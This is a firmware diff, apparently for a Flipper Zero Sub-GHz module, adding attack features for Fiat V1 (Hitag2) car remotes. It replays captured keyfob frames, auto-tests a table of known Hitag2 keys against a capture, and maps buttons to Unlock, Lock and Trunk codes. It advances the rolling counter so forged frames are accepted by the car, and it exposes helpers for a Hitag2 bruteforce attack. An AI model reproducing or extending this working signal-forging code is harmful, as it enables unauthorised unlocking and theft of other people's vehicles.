@@ -4,6 +4,8 @@
 #include <lib/subghz/blocks/encoder.h>
 #include <lib/subghz/blocks/generic.h>
 #include <lib/subghz/blocks/math.h>
+// [PROTOPIRATE_PORT] custom_btn support
+#include <lib/subghz/blocks/custom_btn_i.h>
 #include <string.h>
 
 #define TAG "FiatProtocolV1"
@@ -27,7 +29,7 @@
 #define FIAT_V1_XOR_FIELD         "XOR"
 #define FIAT_V1_HITAG2_KEY_FIELD  "Hitag2 Key"
 #define FIAT_V1_HITAG2_EPOCH_FIELD "Hitag2 Epoch"
-#define FIAT_V1_KNOWN_KEY_COUNT   8U
+// [HITAG2_BF] FIAT_V1_KNOWN_KEY_COUNT is now defined in fiat_v1.h (public API)
 
 #define FIAT_V1_ENC_LEAD_US        2033U
 #define FIAT_V1_ENC_GAP_US         3252U
@@ -264,6 +266,15 @@ static void fiat_v1_decode_fields(SubGhzProtocolDecoderFiatV1* instance) {
     instance->decoder.decode_data = instance->generic.data;
     instance->decoder.decode_count_bit = instance->generic.data_count_bit;
     fiat_v1_verify_hitag2_key(instance);
+
+    // [PROTOPIRATE_PORT] custom_btn support
+    // Fiat V1 full D-pad: OK=captured button, Up=0x8 (Unlock), Down=0x4 (Lock),
+    // Left=0x2 (Trunk), Right=0x1 (Close). All mapped codes are in the valid
+    // {1,2,4,8} set so the re-encrypted frame round-trips through this decoder.
+    if(subghz_custom_btn_get_original() == 0) {
+        subghz_custom_btn_set_original(instance->generic.btn);
+    }
+    subghz_custom_btn_set_max(4);
 }
 
 static bool fiat_v1_commit(
@@ -673,14 +684,44 @@ SubGhzProtocolStatus
     flipper_format_read_uint32(flipper_format, "Btn", &button, 1);
     flipper_format_rewind(flipper_format);
     flipper_format_read_uint32(flipper_format, "Cnt", &control, 1);
-    if(serial == 0U || serial == UINT32_MAX || !fiat_v1_button_valid((uint8_t)button)) {
+
+    // [PROTOPIRATE_PORT] custom_btn support
+    // Fiat V1 full D-pad (only meaningful WHEN A HITAG2 KEY IS AVAILABLE, so a
+    // fresh authenticator can be computed for the changed button):
+    //   OK (default) → captured button, byte-identical replay of the capture
+    //   Up           → 0x8 (Unlock)
+    //   Down         → 0x4 (Lock)
+    //   Left         → 0x2 (Trunk)
+    //   Right        → 0x1 (Close)
+    // All codes are in the valid {1,2,4,8} set so fiat_v1_button_valid() passes
+    // and the receiver accepts the frame. The actual remap + counter increment
+    // is applied below, gated on key_loaded (see the key-present branch); the
+    // no-key path keeps replaying the captured button/frame untouched.
+    const uint8_t original_btn = (uint8_t)(button & 0x0FU);
+    // Ensure the transmitter gate sees a nonzero original button so the D-pad UI
+    // stays enabled (Fiat captured buttons are always nonzero, in {1,2,4,8}).
+    if(subghz_custom_btn_get_original() == 0) {
+        subghz_custom_btn_set_original(original_btn);
+    }
+    subghz_custom_btn_set_max(4);
+    const uint8_t custom_btn_id = subghz_custom_btn_get();
+
+    /* Skip strict validity check when the (possibly custom) button is any 4-bit code.
+     * Only reject if serial is missing/invalid. */
+    if(serial == 0U || serial == UINT32_MAX) {
         return SubGhzProtocolStatusErrorParserOthers;
     }
 
+    // [BUGFIX] Hitag2 Key is now OPTIONAL: if not present in the .sub (which
+    // happens when the capture was serialized before hitag2_key_valid was set,
+    // or when the file was hand-edited), try to auto-discover the key by
+    // iterating the 8 known keys against the captured (uid, btn, cnt, hop).
+    // This mirrors what fiat_v1_verify_hitag2_key() does at RX time.
+    bool key_loaded = false;
     flipper_format_rewind(flipper_format);
-    if(!flipper_format_read_hex(
+    if(flipper_format_read_hex(
            flipper_format, FIAT_V1_HITAG2_KEY_FIELD, instance->hitag2_key, 6U)) {
-        return SubGhzProtocolStatusErrorParserOthers;
+        key_loaded = true;
     }
 
     uint32_t epoch = 0U;
@@ -691,24 +732,131 @@ SubGhzProtocolStatus
         instance->epoch = 0U;
     }
 
+    if(!key_loaded) {
+        // Reconstruct captured hop+btn from the Raw field (or from generic if Raw missing)
+        uint32_t captured_hop = 0U;
+        uint8_t captured_btn = 0U;
+        uint16_t captured_cnt = (uint16_t)(control & 0x03FFU);
+        if(fiat_v1_frame_valid(raw_from_file)) {
+            captured_hop = fiat_v1_hop(raw_from_file);
+            captured_btn = raw_from_file[6] >> 4U;
+        } else {
+            // Fallback: derive from generic.data (upper 32 bits = serial, lower = hop)
+            captured_hop = (uint32_t)(instance->generic.data & 0xFFFFFFFFULL);
+            captured_btn = (uint8_t)(button & 0x0FU);
+        }
+
+        for(uint8_t i = 0U; i < FIAT_V1_KNOWN_KEY_COUNT; i++) {
+            if(fiat_v1_key_matches(
+                   serial,
+                   captured_btn,
+                   captured_cnt,
+                   captured_hop,
+                   fiat_v1_known_keys[i],
+                   instance->epoch)) {
+                memcpy(instance->hitag2_key, fiat_v1_known_keys[i], 6U);
+                key_loaded = true;
+                FURI_LOG_I(TAG, "TX: auto-discovered known key %u", i);
+                break;
+            }
+        }
+    }
+
+    // WHEN A KEY IS AVAILABLE: apply the full D-pad remap and advance the
+    // rolling counter so each direction press synthesizes a fresh valid frame
+    // (mirrors PSA). WHEN NO KEY: leave button/control at the captured values so
+    // the no-key branch below can replay the captured frame byte-for-byte.
+    if(key_loaded) {
+        bool dpad_changed = false;
+        switch(custom_btn_id) {
+        case SUBGHZ_CUSTOM_BTN_UP:
+            button = 0x8U; // Unlock
+            dpad_changed = true;
+            break;
+        case SUBGHZ_CUSTOM_BTN_DOWN:
+            button = 0x4U; // Lock
+            dpad_changed = true;
+            break;
+        case SUBGHZ_CUSTOM_BTN_LEFT:
+            button = 0x2U; // Trunk
+            dpad_changed = true;
+            break;
+        case SUBGHZ_CUSTOM_BTN_RIGHT:
+            button = 0x1U; // Close
+            dpad_changed = true;
+            break;
+        case SUBGHZ_CUSTOM_BTN_OK:
+        default:
+            // OK = re-emit the ORIGINAL captured frame (button + captured
+            // counter + captured hop), byte-identical, so OK == replay of the
+            // capture. Do not advance the counter.
+            button = original_btn;
+            break;
+        }
+
+        // Advance the 10-bit rolling counter for D-pad-driven emulation so each
+        // press sends a NEW counter the car will accept. Honor an explicit
+        // framework counter override if present; otherwise step by the rolling
+        // counter multiplier (like PSA). The captured-button (OK) path keeps the
+        // captured counter so it is an exact replay of the capture.
+        if(dpad_changed) {
+            uint32_t override_cnt = 0U;
+            if(subghz_block_generic_global_counter_override_get(&override_cnt)) {
+                control = override_cnt;
+            } else {
+                control += (uint32_t)furi_hal_subghz_get_rolling_counter_mult();
+            }
+        }
+    }
+
     control &= 0x03FFU;
     button &= 0x0FU;
     instance->generic.serial = serial;
     instance->generic.btn = (uint8_t)button;
     instance->generic.cnt = control;
-    instance->hop = fiat_v1_bcm_generate_authenticator(
-        serial, (uint8_t)button, (uint16_t)control, instance->hitag2_key, instance->epoch);
-    instance->generic.data = ((uint64_t)serial << 32U) | instance->hop;
-    instance->generic.data_count_bit = FIAT_V1_LOGICAL_BITS;
 
-    fiat_v1_build_raw(
-        instance->raw_data,
-        serial,
-        (uint8_t)button,
-        (uint16_t)control,
-        instance->hop,
-        instance->tail_bits);
-    instance->frame_xor = instance->raw_data[12];
+    if(key_loaded) {
+        // KEY PRESENT: recompute the hop for the (possibly D-pad changed) button
+        // and counter, then rebuild the raw frame. For the captured button this
+        // reproduces the captured hop byte-identically; for a changed button /
+        // advanced counter it produces a fresh valid frame.
+        instance->hop = fiat_v1_bcm_generate_authenticator(
+            serial, (uint8_t)button, (uint16_t)control, instance->hitag2_key, instance->epoch);
+        instance->generic.data = ((uint64_t)serial << 32U) | instance->hop;
+        instance->generic.data_count_bit = FIAT_V1_LOGICAL_BITS;
+
+        fiat_v1_build_raw(
+            instance->raw_data,
+            serial,
+            (uint8_t)button,
+            (uint16_t)control,
+            instance->hop,
+            instance->tail_bits);
+        instance->frame_xor = instance->raw_data[12];
+    } else {
+        // NO KEY: byte-identical REPLAY of the captured frame. The key is only
+        // needed to synthesize the NEXT signal (changed button / advanced
+        // counter); the already-captured frame is stored in full (the 13-byte
+        // Raw field) so we can re-send it exactly as decoded without any crypto.
+        // Requires a valid Raw field; without it there is nothing to replay.
+        if(!fiat_v1_frame_valid(raw_from_file)) {
+            FURI_LOG_E(
+                TAG,
+                "TX: no Hitag2 Key and no replayable Raw frame (uid=%08lX)",
+                (unsigned long)serial);
+            return SubGhzProtocolStatusErrorParserOthers;
+        }
+        memcpy(instance->raw_data, raw_from_file, FIAT_V1_WIRE_BYTES);
+        instance->hop = fiat_v1_hop(instance->raw_data);
+        instance->frame_xor = instance->raw_data[12];
+        instance->generic.btn = instance->raw_data[6] >> 4U;
+        instance->generic.data = ((uint64_t)serial << 32U) | instance->hop;
+        instance->generic.data_count_bit = FIAT_V1_LOGICAL_BITS;
+        FURI_LOG_I(
+            TAG,
+            "TX(replay) UID:%08lX (no key, replaying captured frame)",
+            (unsigned long)serial);
+    }
 
     uint32_t repeat = FIAT_V1_ENC_DEFAULT_REPEAT;
     flipper_format_rewind(flipper_format);
@@ -943,26 +1091,61 @@ void subghz_protocol_decoder_fiat_v1_get_string(void* context, FuriString* outpu
     furi_check(context);
     SubGhzProtocolDecoderFiatV1* instance = context;
 
-    furi_string_cat_printf(
-        output,
-        "%s %ubit %s\r\n"
-        "%08lX %03lX%01X %08lX\r\n"
-        "Sync:%02X UID:%08lX Auth:%08lX\r\n"
-        "Btn:%02X [%s] Ctrl:%03lX\r\n"
-        "Tail:%u XOR:%02X\r\n",
-        instance->generic.protocol_name,
-        FIAT_V1_LOGICAL_BITS,
-        instance->hitag2_key_valid ? "KEY:OK" : "KEY:??",
-        (unsigned long)instance->generic.serial,
-        (unsigned long)instance->generic.cnt,
-        instance->generic.btn,
-        (unsigned long)instance->hop,
-        instance->family,
-        (unsigned long)instance->uid,
-        (unsigned long)instance->hop,
-        instance->generic.btn,
-        fiat_v1_button_name(instance->generic.btn),
-        (unsigned long)instance->generic.cnt,
-        instance->tail_bits,
-        instance->frame_xor);
+    // Key line: the 6-byte hitag2 key recovered by the Hitag2Hell attack, or
+    // "?" when it has not been recovered yet (capture without a matching key).
+    if(instance->hitag2_key_valid) {
+        furi_string_cat_printf(
+            output,
+            "%s %ubit\r\n"
+            "Key:%02X%02X%02X%02X%02X%02X\r\n"
+            "SN:0x%lX Btn:[%s]\r\n"
+            "Cnt:%03lX\r\n",
+            instance->generic.protocol_name,
+            FIAT_V1_LOGICAL_BITS,
+            instance->hitag2_key[0],
+            instance->hitag2_key[1],
+            instance->hitag2_key[2],
+            instance->hitag2_key[3],
+            instance->hitag2_key[4],
+            instance->hitag2_key[5],
+            (unsigned long)instance->generic.serial,
+            fiat_v1_button_name(instance->generic.btn),
+            (unsigned long)instance->generic.cnt);
+    } else {
+        furi_string_cat_printf(
+            output,
+            "%s %ubit\r\n"
+            "Key:?\r\n"
+            "SN:0x%lX Btn:[%s]\r\n"
+            "Cnt:%03lX\r\n",
+            instance->generic.protocol_name,
+            FIAT_V1_LOGICAL_BITS,
+            (unsigned long)instance->generic.serial,
+            fiat_v1_button_name(instance->generic.btn),
+            (unsigned long)instance->generic.cnt);
+    }
+}
+
+// [HITAG2_BF] Public API for Hitag2 bruteforce helper
+uint32_t subghz_protocol_fiat_v1_compute_auth(
+    uint32_t uid,
+    uint8_t button,
+    uint16_t control,
+    const uint8_t key[6],
+    uint32_t epoch) {
+    return fiat_v1_bcm_generate_authenticator(uid, button, control, key, epoch);
+}
+
+bool subghz_protocol_fiat_v1_verify_key(
+    uint32_t uid,
+    uint8_t button,
+    uint16_t control,
+    uint32_t hop,
+    const uint8_t key[6],
+    uint32_t epoch) {
+    return fiat_v1_key_matches(uid, button, control, hop, key, epoch);
+}
+
+const uint8_t (*subghz_protocol_fiat_v1_get_known_keys(void))[6] {
+    return fiat_v1_known_keys;
 }
